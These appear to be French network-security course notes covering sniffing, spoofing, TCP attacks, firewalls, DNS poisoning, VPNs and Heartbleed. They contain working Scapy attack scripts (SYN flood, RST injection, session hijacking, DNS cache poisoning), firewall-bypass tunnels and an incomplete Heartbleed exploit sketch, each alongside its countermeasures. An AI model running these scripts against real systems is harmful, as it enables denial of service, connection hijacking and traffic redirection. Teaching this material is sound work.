Capture & Falsification de Paquets

Chapitre 15 — Packet Sniffing & Spoofing

15.1 Comment les paquets sont reçus▼

Les machines sont connectées aux réseaux via des Cartes d'Interface Réseau (NIC). Chaque NIC possède une adresse matérielle appelée adresse MAC. Les réseaux locaux (Ethernet, WiFi) sont des médias broadcast : toutes les NIC entendent toutes les trames.

Quand une trame arrive, la NIC vérifie l'adresse MAC destination :

  • Si l'adresse correspond → la trame est copiée dans le buffer noyau (Ring Buffer) via DMA
  • La CPU est interrompue pour traiter le paquet
  • Le paquet est dispatché aux applications via le stack réseau

Mode Promiscuous

En mode normal, la NIC rejette les trames non destinées à elle. En mode promiscueux, la NIC transmet TOUS les paquets au noyau, peu importe l'adresse MAC destination. Cela permet le sniffing. Nécessite les droits root.

Application (User Space)
↑ Protocoles réseau
Ring Buffer (Kernel)
↑ DMA
NIC — Carte Réseau
↑
Réseau (câble/WiFi)

BSD Packet Filter (BPF)

Le BPF permet de filtrer les paquets au niveau le plus bas (noyau) avant de les livrer à l'application. Cela évite de traiter tous les paquets inutilement. Les filtres sont écrits en expressions booléennes lisibles (ex: ip proto icmp, dst host 10.0.2.5).

15.2 Packet Sniffing▼

Le sniffing consiste à capturer les paquets en transit sur un réseau. Il est utilisé par les administrateurs pour diagnostiquer, et par les attaquants pour la reconnaissance.

Sockets bruts (Raw Sockets)

Un socket normal ne reçoit que les paquets qui lui sont destinés. Un raw socket reçoit une copie de TOUS les paquets. On crée un raw socket avec :

int sock = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
// Activer le mode promiscueux
mr.mr_type = PACKET_MR_PROMISC;
setsockopt(sock, SOL_PACKET, PACKET_ADD_MEMBERSHIP, &mr, sizeof(mr));

API pcap (libpcap)

La bibliothèque libpcap offre une interface portable et optimisée pour la capture :

// 1. Ouvrir la session de capture
pcap_t *handle = pcap_open_live("eth0", BUFSIZ, 1, 1000, errbuf);
// 2. Compiler et appliquer un filtre
pcap_compile(handle, &fp, "ip proto icmp", 0, net);
pcap_setfilter(handle, &fp);
// 3. Boucle de capture
pcap_loop(handle, -1, got_packet, NULL);

Analyser un paquet capturé

On utilise le type casting pour accéder aux champs des headers :

struct ethheader *eth = (struct ethheader *) packet;
if (ntohs(eth->ether_type) == 0x0800) { // Paquet IP
    struct ipheader *ip = (struct ipheader *)
                          (packet + sizeof(struct ethheader));
    printf("Source: %s
", inet_ntoa(ip->iph_sourceip));
    printf("Dest:   %s
", inet_ntoa(ip->iph_destip));
}
💡 Exemples de filtres pcap : dst host 10.0.2.5, src host 10.0.2.6, proto tcp, host 10.0.2.6 and src port 9090

15.3 Packet Spoofing▼

Le spoofing consiste à envoyer des paquets avec des informations falsifiées (IP source, port, flags TCP…). C'est la base de nombreuses attaques : SYN Flood, DNS Poisoning, Session Hijacking.

Envoi avec Raw Socket

Avec un raw socket, on construit entièrement le paquet (header IP + header protocole + données) :

// Créer le socket brut
int sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
int enable = 1;
setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &enable, sizeof(enable));

// Construire le header IP
ip->iph_ver = 4;
ip->iph_ttl = 20;
ip->iph_sourceip.s_addr = inet_addr("1.2.3.4"); // IP falsifiée
ip->iph_destip.s_addr   = inet_addr("10.0.2.69");
ip->iph_protocol = IPPROTO_ICMP;

// Envoyer
sendto(sock, ip, ntohs(ip->iph_len), 0,
       (struct sockaddr*)&dest_info, sizeof(dest_info));
⚠️ Seul root (ou CAP_NET_RAW) peut créer des raw sockets !

Spoofing avec Scapy (Python)

from scapy.all import *
# Spoofed ICMP
pkt = IP(src="1.2.3.4", dst="10.0.2.69") / ICMP()
send(pkt)
# Spoofed UDP
pkt = IP(src="1.2.3.4", dst="10.0.2.69") / UDP(dport=9090) / "Hello"
send(pkt)

15.7 Endianness (Ordre des octets)▼

Les processeurs x86 utilisent le format Little-Endian (octet de faible poids en premier). Le réseau utilise le format Big-Endian (Network Byte Order, octet de fort poids en premier). Il faut donc convertir !

Little-Endian (x86)
Valeur 256 (0x0100)
Mémoire: [00][01]
Big-Endian (Réseau)
Valeur 256 (0x0100)
Mémoire: [01][00]

Fonctions de conversion

FonctionRôle
htons(x)Host→Network short (16 bits)
htonl(x)Host→Network long (32 bits)
ntohs(x)Network→Host short
ntohl(x)Network→Host long
🚨 Bug classique : sans conversion, 255 octets peut être interprété comme ~4 Go → crash/DoS !

Attaques sur le Protocole TCP

Chapitre 16 — TCP Attacks

16.1 Fonctionnement du protocole TCP▼

TCP (Transmission Control Protocol) est un protocole de transport fiable et ordonné. Il établit une connexion logique entre deux machines avant d'échanger des données.

TCP Header — Format

Port Source (16 bits)Port Destination (16 bits)
Numéro de Séquence (32 bits)
Numéro d'Acquittement (32 bits)
Offset (4)RéservéFlags: SYN FIN ACK RST PSH URGFenêtre (16)
Checksum (16)Pointeur Urgent (16)
  • Numéro de séquence : identifie le premier octet du segment
  • Numéro d'acquittement : prochain octet attendu
  • Flags SYN/FIN/RST : contrôle de connexion
  • Fenêtre : contrôle de flux

Three-Way Handshake

Client
──── SYN (seq=x) ────→
←── SYN+ACK (seq=y, ack=x+1) ──
──── ACK (ack=y+1) ────→
Connexion établie ✅
Serveur
← reçoit SYN → stocke TCB
← attend ACK...
Connexion établie ✅

16.2 Attaque SYN Flooding▼

Le SYN Flooding est une attaque DoS qui exploite la file d'attente des connexions semi-ouvertes du serveur.

Principe

Attaquant
──── SYN (IP source aléatoire) ────→ ×1000
Serveur
File TCB : [⬜⬜⬜⬜⬜⬜⬜⬜] PLEINE
❌ Plus de place → Nouveaux clients rejetés

Mécanisme détaillé

  1. L'attaquant envoie des milliers de SYN avec des IP sources spoofées
  2. Le serveur répond SYN+ACK et stocke un TCB dans sa file
  3. Le 3ème ACK n'arrive jamais → entrées restent jusqu'au timeout (~40s)
  4. La file est pleine → le serveur rejette tous les nouveaux SYN
# Attaque avec netwox
sudo netwox 76 -i 10.0.2.69 -p 23 -s raw

# Ou avec Scapy
from scapy.all import *
while True:
    src_ip = ".".join([str(random.randint(1,254)) for _ in range(4)])
    pkt = IP(src=src_ip, dst="10.0.2.69") / TCP(dport=23, flags="S")
    send(pkt, verbose=0)

Contre-mesure : SYN Cookies

Le serveur encode l'état de la connexion dans le numéro de séquence du SYN+ACK. Aucune mémoire allouée avant la réception du 3ème ACK.

# Activer SYN Cookies (Linux)
sysctl -w net.ipv4.tcp_syncookies=1
✅ Avec SYN cookies : l'attaquant peut flooder, mais aucune ressource n'est consommée côté serveur !

16.3 Attaque TCP Reset▼

Un seul paquet RST peut couper une connexion TCP existante entre deux victimes.

Comment TCP ferme une connexion

  • Méthode douce (FIN) : A envoie FIN → B répond ACK → B envoie FIN → A répond ACK
  • Méthode brutale (RST) : Un seul paquet RST coupe immédiatement la connexion

L'attaque

L'attaquant spoofe un paquet RST de A vers B (ou de B vers A). Pour réussir, il doit deviner :

  • IP source et destination (par sniffing)
  • Port source et destination (par sniffing)
  • Numéro de séquence dans la fenêtre de réception (critique !)
from scapy.all import *
# Sniffer pour trouver seq number
def spoof_rst(pkt):
    if TCP in pkt:
        rst = IP(src=pkt[IP].src, dst=pkt[IP].dst) /               TCP(sport=pkt[TCP].sport, dport=pkt[TCP].dport,
                  seq=pkt[TCP].seq, flags="R")
        send(rst, verbose=0)

sniff(filter="tcp", prn=spoof_rst)
⚠️ Le bit RST est employé par le Great Firewall of China pour censurer les connexions !

16.4 Session Hijacking (Détournement de session)▼

L'attaquant injecte des données malveillantes dans une connexion TCP existante entre A et B.

Étapes

  1. Sniffing : intercepter les paquets pour obtenir seq/ack, ports, IPs
  2. Spoofing : envoyer un paquet spoofé avec le bon numéro de séquence
  3. La victime exécute la commande injectée
from scapy.all import *

def hijack(pkt):
    if pkt[TCP].payload:
        newpkt = IP(src=pkt[IP].src, dst=pkt[IP].dst) /                  TCP(sport=pkt[TCP].sport,
                     dport=pkt[TCP].dport,
                     seq=pkt[TCP].seq,
                     ack=pkt[TCP].ack,
                     flags="PA") /                  "commande malveillante
"
        send(newpkt)

sniff(filter="tcp and src host 10.0.2.68", prn=hijack)
🚨 Conséquence : désynchronisation des numéros seq/ack → la connexion légitime est cassée !

Pare-feu (Firewall)

Chapitre 17 — Firewall

17.1 & 17.2 Introduction et Types▼

Un pare-feu est un système de sécurité qui filtre le trafic réseau entre zones de confiance différentes. Il applique une politique de sécurité en autorisant ou bloquant les paquets.

Internet (Non fiable)
→
🛡 FIREWALL
→
Réseau Local (Fiable)

Types de pare-feu

TypeFonctionnementNiveau
Packet FilterFiltre par IP/port/protocoleRéseau (L3/L4)
StatefulSuit l'état des connexionsTransport (L4)
Application/ProxyAnalyse le contenu applicatifApplication (L7)
  • Filtrage Ingress : filtre le trafic entrant
  • Filtrage Egress : filtre le trafic sortant
  • Politique par défaut : blocage tout sauf autorisé (whitelist) ou autoriser tout sauf bloqué (blacklist)

17.4 iptables — Pare-feu Linux▼

iptables est l'outil standard de pare-feu sous Linux. Il utilise des chaînes de règles pour filtrer les paquets.

INPUT
Paquets destinés à la machine locale
FORWARD
Paquets traversant la machine (routeur)
OUTPUT
Paquets générés par la machine

Commandes iptables essentielles

# Afficher les règles
iptables -L -n -v

# Bloquer tout le trafic entrant par défaut
iptables -P INPUT DROP
iptables -P FORWARD DROP

# Autoriser SSH (port 22)
iptables -A INPUT -p tcp --dport 22 -j ACCEPT

# Autoriser le trafic établi (Stateful)
iptables -A INPUT -m conntrack --ctstate ESTABLISHED,RELATED -j ACCEPT

# Bloquer une IP spécifique
iptables -A INPUT -s 10.0.2.100 -j DROP

# Bloquer le ping (ICMP)
iptables -A INPUT -p icmp --icmp-type echo-request -j DROP

# Autoriser uniquement Telnet depuis un sous-réseau
iptables -A INPUT -p tcp -s 10.0.2.0/24 --dport 23 -j ACCEPT

# NAT (partage de connexion)
iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE

17.5 Contournement de Pare-feu▼

Les pare-feux peuvent être contournés par plusieurs techniques :

SSH Tunneling

Encapsuler du trafic interdit dans une connexion SSH autorisée :

# Tunnel local : accéder à internal:80 via localhost:8080
ssh -L 8080:internal-server:80 user@jump-host

# Tunnel reverse : exposer un service local derrière un firewall
ssh -R 9090:localhost:80 user@external-server

# SOCKS proxy (tunnel dynamique)
ssh -D 1080 user@external-server
# Puis configurer le navigateur pour utiliser SOCKS5 sur localhost:1080

VPN (Virtual Private Network)

Le trafic est encapsulé dans un tunnel chiffré, le pare-feu ne voit que le protocole VPN (souvent UDP/443 ou TCP/443).

💡 Les pare-feux sont contournables — une bonne politique de sécurité nécessite plusieurs couches de défense (defense-in-depth).

DNS et Attaques DNS

Chapitre 18 — Domain Name System & Attacks

18.1 Fonctionnement du DNS▼

Le DNS (Domain Name System) traduit les noms de domaine (ex: google.com) en adresses IP. C'est l'annuaire téléphonique d'Internet.

Client → "Quelle est l'IP de google.com ?"
↓ 1. Requête récursive
Résolveur local (cache DNS)
↓ 2. Si pas en cache
Root Server (.) → "Demandez .com"
↓ 3.
TLD Server (.com) → "Demandez google.com NS"
↓ 4.
Serveur Autoritaire google.com → "142.250.x.x"

Types d'enregistrements DNS

TypeDescriptionExemple
ANom → IPv4google.com → 142.250.74.14
AAAANom → IPv6google.com → 2a00:1450:...
NSName Servergoogle.com NS ns1.google.com
MXMail Exchangegoogle.com MX smtp.google.com
PTRIP → Nom (reverse)142.250.74.14 → google.com
TTLDurée en cache (secondes)300 = 5 minutes

Protocole : UDP port 53 (requêtes <512 octets). TCP port 53 (transferts de zones, réponses >512 octets).

18.2 Attaque DNS Cache Poisoning▼

Le DNS cache poisoning consiste à injecter de fausses réponses DNS dans le cache d'un résolveur, pour rediriger les utilisateurs vers un serveur malveillant.

Pourquoi DNS est vulnérable ?

  • Pas d'authentification : n'importe qui peut envoyer une réponse DNS
  • Transaction ID : seulement 16 bits → 65 536 valeurs possibles
  • Effet cache : une fausse réponse reste des heures/jours

Attaque de Kaminsky (2008)

Attaquant
1. Demande random-xyz.example.com (force nouvelle requête)
2. Envoie 65536 fausses réponses avec tous les Transaction IDs
Résolveur victime
Si une réponse a le bon ID → le cache est empoisonné !
Tous les utilisateurs redirigés vers serveur malveillant 😈
from scapy.all import *
# Empoisonner le cache DNS pour example.com
def poison(pkt):
    if DNS in pkt and pkt[DNS].qr == 0:  # requête
        fake = IP(dst=pkt[IP].src) /                UDP(dport=pkt[UDP].sport, sport=53) /                DNS(id=pkt[DNS].id, qr=1, aa=1,
                   an=DNSRR(rrname="example.com",
                            rdata="malicious-ip"))
        send(fake)
sniff(filter="udp port 53", prn=poison)

Contre-mesures

  • Randomisation du port source : augmente l'espace à 65536 × 65536 combinaisons
  • DNSSEC : signatures cryptographiques authentifiant les réponses
  • DNS over HTTPS (DoH) / DNS over TLS (DoT)

18.3 DNS Rebinding▼

L'attaque de DNS Rebinding contourne la Same-Origin Policy (SOP) du navigateur pour accéder à des ressources du réseau local depuis un site distant.

Bypass de la Same-Origin Policy

  1. L'attaquant contrôle attacker.com avec un TTL très court (0)
  2. La victime visite attacker.com → résolution DNS donne l'IP de l'attaquant
  3. Le JavaScript de l'attaquant s'exécute dans le navigateur
  4. Le DNS de attacker.com est changé → pointe maintenant vers 192.168.1.1 (routeur local)
  5. Le navigateur pense que attacker.com = même origine que le routeur
  6. Le JS peut accéder au routeur, aux IoT, etc.
⚠️ Utilisé pour attaquer des appareils IoT (caméras, routeurs) sur le réseau local de la victime !

Contre-mesures

  • Vérifier l'en-tête Host côté serveur
  • Utiliser HTTPS avec certificats valides
  • Configurer les routeurs pour refuser les requêtes avec Host inattendu

VPN — Réseau Privé Virtuel

Chapitre 19 — Virtual Private Network

19.1 Introduction au VPN▼

Un VPN (Virtual Private Network) crée un tunnel chiffré entre deux machines sur un réseau non fiable (Internet). Il permet de :

  • Relier deux réseaux distants de façon sécurisée (VPN site-à-site)
  • Télétravail sécurisé : accéder au réseau d'entreprise depuis chez soi
  • Confidentialité : chiffrer tout le trafic, masquer l'IP réelle
  • Contourner la censure ou les restrictions géographiques
Réseau A
10.0.1.0/24
══════ Tunnel VPN (chiffré) ══════
Internet (non fiable)
Réseau B
192.168.1.0/24

19.2 TUN/TAP — Interface VPN Linux▼

Sous Linux, les VPNs utilisent des interfaces virtuelles TUN ou TAP :

TypeCoucheUtilisation
TUNL3 (IP)Paquets IP → VPN de type routé
TAPL2 (Ethernet)Frames Ethernet → VPN de type bridge
# Créer une interface TUN
ip tuntap add dev tun0 mode tun
ip addr add 10.8.0.1/24 dev tun0
ip link set tun0 up
ip route add 192.168.1.0/24 dev tun0

Fonctionnement d'un VPN TUN

  1. Application envoie un paquet vers 192.168.1.5
  2. Le noyau route le paquet vers l'interface tun0
  3. Le programme VPN lit le paquet depuis tun0
  4. Il le chiffre et encapsule dans un paquet UDP/TCP
  5. L'envoie vers le serveur VPN via Internet
  6. Le serveur VPN décapsule, déchiffre → injecte dans son interface tun0

19.3 OpenVPN et SSH Tunneling▼

OpenVPN

OpenVPN est une implémentation VPN open-source basée sur TLS/SSL :

# Serveur OpenVPN (openvpn.conf)
dev tun
proto udp
port 1194
ca   ca.crt
cert server.crt
key  server.key
dh   dh2048.pem
server 10.8.0.0 255.255.255.0
push "route 192.168.1.0 255.255.255.0"

# Client
openvpn --config client.ovpn

SSH Tunneling (alternative légère)

# Tunnel local : localhost:8080 → serveur_interne:80
ssh -L 8080:serveur_interne:80 user@vpn_server

# Tunnel inverse : port 9090 du serveur → localhost:22
ssh -R 9090:localhost:22 user@vpn_server

# SOCKS5 proxy dynamique (remplace un VPN complet)
ssh -D 1080 user@vpn_server
# Navigateur → Proxy SOCKS5 → localhost:1080
💡 SSH tunneling est pratique pour contourner un firewall qui bloque tout sauf le port 22 !

Le Bug Heartbleed

Chapitre 20 — The Heartbleed Bug & Attack

20.1 Description du Bug▼

Le bug Heartbleed (CVE-2014-0160) est une vulnérabilité critique dans OpenSSL qui a affecté des millions de serveurs web entre 2012 et 2014.

🚨 CVSS Score: 7.5 (HIGH) — Permet de lire la mémoire du serveur, y compris les clés privées SSL !

Le protocole Heartbeat (RFC 6520)

Le heartbeat TLS permet de garder une connexion TLS active en envoyant un message "je suis vivant" :

  1. Client envoie : [Type=Heartbeat, Length=100, "AAAA..."]
  2. Serveur répond : [Type=Heartbeat, Length=100, "AAAA..."]
  3. Le serveur copie length octets depuis sa mémoire dans la réponse

Le bug : absence de validation

Attaquant envoie :
Length=65535 mais Payload="AA" (2 octets seulement)
↓
OpenSSL vulnérable :
Ne vérifie pas que Length ≤ taille réelle du payload
↓
Serveur répond avec 65535 octets de sa MÉMOIRE INTERNE
= mots de passe, cookies, clés privées SSL !

20.2 Code vulnérable et Exploitation▼

Code OpenSSL vulnérable (simplifié)

// VULNÉRABLE — OpenSSL avant 1.0.1g
int tls1_process_heartbeat(SSL *s) {
    unsigned char *p = &s->s3->rrec.data[0];
    unsigned int payload;

    // Lire le type et la longueur déclarée par le client
    hbtype = *p++;
    n2s(p, payload);  // ← Length déclarée par le CLIENT (non vérifiée !)

    // BUG : on copie 'payload' octets depuis la mémoire
    // sans vérifier si le vrai message est aussi long !
    memcpy(bp, pl, payload);  // ← Lit jusqu'à 64KB de mémoire !
}

Correction (OpenSSL 1.0.1g)

// CORRIGÉ
if (payload + padding > s->s3->rrec.length)
    return 0;  // Rejeter si length > taille réelle

Exploitation avec Python

import socket, struct

def heartbleed(host, port=443):
    s = socket.socket()
    s.connect((host, port))
    # Envoyer le handshake TLS...
    # Envoyer le heartbeat malveillant
    payload = b'@'
    # Type=18(heartbeat), Version=3.2, Length=3,
    # Heartbeat type=1, PAYLOAD LENGTH=16384 (truqué !)
    s.send(payload)
    data = s.recv(65535)
    print("Mémoire volée:", data.hex())

Impact et leçons

  • ~500 000 serveurs affectés (17% des serveurs HTTPS)
  • Clés privées SSL, mots de passe, cookies de session compromis
  • Leçon : Toujours valider les entrées utilisateur, même dans des protocoles de bas niveau !
✅ Correction : mettre à jour OpenSSL ≥ 1.0.1g et regénérer tous les certificats SSL !
